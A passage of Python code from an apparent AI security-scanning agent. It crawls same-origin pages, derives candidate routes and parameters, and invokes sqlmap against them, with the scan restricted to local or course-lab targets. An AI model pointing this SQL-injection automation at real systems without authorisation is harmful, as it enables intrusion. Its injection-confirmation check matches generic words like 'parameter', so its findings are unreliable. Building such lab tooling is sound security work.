    labels: list[str] = []
    for item in items:
        if not isinstance(item, dict):
            continue
        seed = str(item.get("seed", "")).strip()
        if not seed:
            continue
        priority = str(item.get("priority", "low")).strip() or "low"
        traits = str(item.get("traits", "generic")).strip() or "generic"
        components = str(item.get("components", seed)).strip() or seed
        labels.append(f"{seed}:{priority}:{traits}:{components}")
    return labels


def _should_use_sqlmap(use_sqlmap: bool | None) -> bool:
    if use_sqlmap is not None:
        return use_sqlmap
    return os.environ.get("AI_SECURITY_AGENT_SQLMAP", "").strip().lower() in {"1", "true", "yes", "on"}


def _run_sqlmap_for_probe(probe: dict[str, object]) -> dict[str, str]:
    candidate = probe.get("candidate")
    if not isinstance(candidate, Candidate):
        return {"status": "skipped", "summary": "missing candidate context"}
    sqlmap_path = _find_sqlmap_path()
    if not sqlmap_path:
        return {"status": "skipped", "summary": "sqlmap.py was not found under tools/sqlmap or python_mvp/tools/sqlmap"}

    baseline_req = _request_for(candidate, candidate.normal_value)
    if not is_local_or_lab_target(str(baseline_req["url"])):
        return {"status": "skipped", "summary": "sqlmap is restricted to local/course-lab targets"}

    command = [
        sys.executable,
        str(sqlmap_path),
        "-u",
        baseline_req["url"],
        "--batch",
        "--risk=1",
        "--level=1",
        "--technique=BEU",
        "--flush-session",
        "--timeout=5",
        "--retries=0",
        "--answers=follow=N",
    ]
    if baseline_req.get("method") == "POST" and baseline_req.get("body"):
        command.extend(["--data", baseline_req["body"]])

    try:
        completed = subprocess.run(
            command,
            cwd=str(sqlmap_path.parent),
            text=True,
            capture_output=True,
            timeout=45,
            check=False,
        )
    except subprocess.TimeoutExpired:
        return {
            "status": "timeout",
            "command": _display_command(command),
            "summary": "sqlmap did not finish within the 45 second controlled timeout",
        }
    except OSError as exc:
        return {"status": "failed", "command": _display_command(command), "summary": str(exc)}

    output = (completed.stdout or "") + "\n" + (completed.stderr or "")
    return {
        "status": "ok" if _sqlmap_confirms_injection(output) else "not_confirmed",
        "command": _display_command(command),
        "summary": _summarize_sqlmap_output(output, completed.returncode),
    }


def _find_sqlmap_path() -> Path | None:
    here = Path(__file__).resolve()
    candidates = [
        here.parents[4] / "tools" / "sqlmap" / "sqlmap.py",
        here.parents[3] / "tools" / "sqlmap" / "sqlmap.py",
    ]
    for path in candidates:
        if path.exists():
            return path
    return None


def _sqlmap_confirms_injection(output: str) -> bool:
    lowered = output.lower()
    return any(
        marker in lowered
        for marker in (
            "is vulnerable",
            "parameter",
            "appears to be",
            "sqlmap identified the following injection point",
            "payload:",
        )
    ) and "not injectable" not in lowered


def _summarize_sqlmap_output(output: str, returncode: int) -> str:
    interesting: list[str] = []
    for line in output.splitlines():
        clean = re.sub(r"\s+", " ", line).strip()
        lowered = clean.lower()
        if not clean:
            continue
        if any(marker in lowered for marker in ("parameter", "payload", "injectable", "vulnerable", "back-end dbms", "warning", "critical")):
            interesting.append(clean)
        if len(interesting) >= 6:
            break
    if not interesting:
        interesting.append(f"sqlmap finished with return code {returncode}; no concise injection summary was found.")
    return " | ".join(interesting)


def _display_command(command: list[str]) -> str:
    redacted: list[str] = []
    for part in command:
        redacted.append(_mask_body(part))
    return " ".join(f'"{part}"' if " " in part else part for part in redacted)


def _origin(url: str) -> str:
    parsed = urlparse(url)
    return f"{parsed.scheme}://{parsed.netloc}".lower()


def _normalize_url(url: str) -> str:
    parsed = urlparse(url)
    return urlunparse(parsed._replace(fragment=""))


def _is_crawlable_same_origin(url: str, origin: str) -> bool:
    parsed = urlparse(url)
    if not parsed.scheme or not parsed.netloc:
        return False
    if f"{parsed.scheme}://{parsed.netloc}".lower() != origin:
        return False
    lowered_path = parsed.path.lower()
    if any(lowered_path.endswith(suffix) for suffix in SKIP_URL_SUFFIXES):
        return False
    if "logout" in lowered_path:
        return False
    return True


def _followup_seed_urls(target: str, followup_inputs: dict[str, object]) -> list[str]:
    if not followup_inputs:
        return []
    seed_keys = (
        "api_paths",
        "auth_paths",
        "framework_routes",
        "route_prefixes",
        "config_entrypoints",
        "download_export_paths",
        "upload_import_paths",
        "correlated_discovery_seeds",
        "relationship_followup_seeds",
    )
    seed_urls: list[str] = []
    for key in seed_keys:
        values = followup_inputs.get(key, [])
        if not isinstance(values, list):
            continue
        for raw_value in values[:12]:
            path = _normalize_followup_seed(raw_value)
            if not path:
                continue
            resolved = _normalize_url(urljoin(target, path))
            if resolved not in seed_urls:
                seed_urls.append(resolved)
    return seed_urls


def _state_seed_urls(followup_inputs: dict[str, object]) -> list[str]:
    seed_urls: list[str] = []
    for key in ("authenticated_urls", "seed_urls", "discovered_urls"):
        values = followup_inputs.get(key, [])
        if not isinstance(values, list):
            continue
        for value in values[:30]:
            text = str(value or "").strip()
            if text and text not in seed_urls:
                seed_urls.append(text)
    return seed_urls


def _request_headers_from_followup(followup_inputs: dict[str, object], context: dict | None) -> dict[str, str]:
    headers = followup_inputs.get("request_headers", {}) if isinstance(followup_inputs, dict) else {}
    if not isinstance(headers, dict):
        request_context = followup_inputs.get("request_context", {}) if isinstance(followup_inputs, dict) else {}
        headers = request_context.get("request_headers", {}) if isinstance(request_context, dict) else {}
    if not isinstance(headers, dict):
        headers = {}
    direct = (context or {}).get("request_headers", {}) if isinstance(context, dict) else {}
    merged = dict(headers)
    if isinstance(direct, dict):
        merged.update(direct)
    return {str(key): str(value) for key, value in merged.items() if str(key).strip() and str(value).strip()}


def _normalize_followup_seed(raw_value: object) -> str:
    text = str(raw_value or "").strip()
    if not text:
        return ""
    route_match = ROUTE_PATH_RE.search(text)
    if route_match:
        text = route_match.group(1)
    if "->" in text:
        text = text.split("->", 1)[0].strip()
    if text.startswith(("http://", "https://")):
        return text
    if " " in text and text.startswith("/"):
        text = text.split(" ", 1)[0]
    text = re.sub(r"\{[^}]+\}", "1", text)
    text = re.sub(r":[A-Za-z_][A-Za-z0-9_]*", "1", text)
    return text if text.startswith("/") else f"/{text.lstrip('/')}"


def _followup_parameter_hints(followup_inputs: dict[str, object]) -> list[str]:
    if not followup_inputs:
        return []
    hints: list[str] = []
    for key, values in followup_inputs.items():
        if not isinstance(values, list):
            continue
        for value in values[:12]:
            lowered = str(value or "").lower()
            for name in INTERESTING_PARAM_NAMES:
                if re.search(rf"(?<![a-z0-9_]){re.escape(name)}(?![a-z0-9_])", lowered):
                    if name not in hints:
                        hints.append(name)
            if any(token in lowered for token in ("detail", "profile", "download", "export", "record")):
                if "id" not in hints:
                    hints.append("id")
            if "user" in lowered and "user_id" not in hints:
                hints.append("user_id")
            if "search" in lowered and "search" not in hints:
                hints.append("search")
    return hints[:8]


def _followup_seed_candidates(
    seed_urls: list[str],
    param_hints: list[str],
    discovered_candidates: list[Candidate],
) -> list[Candidate]:
    if not seed_urls or not param_hints:
        return []
    existing_pages = {_page_key(candidate.page_url) for candidate in discovered_candidates}
    candidates: list[Candidate] = []
    for seed_url in seed_urls[:6]:
        if _page_key(seed_url) in existing_pages:
            continue
        for name in param_hints[:2]:
            candidates.append(
                _candidate_for(
                    seed_url,
                    name,
                    "followup-seed",
                    "Backup-derived route hints suggest this endpoint may accept database-backed input.",
                    method="GET",
                )
            )
    return candidates


def _page_key(url: str) -> str:
    parsed = urlparse(url)
    return urlunparse(parsed._replace(query="", fragment=""))
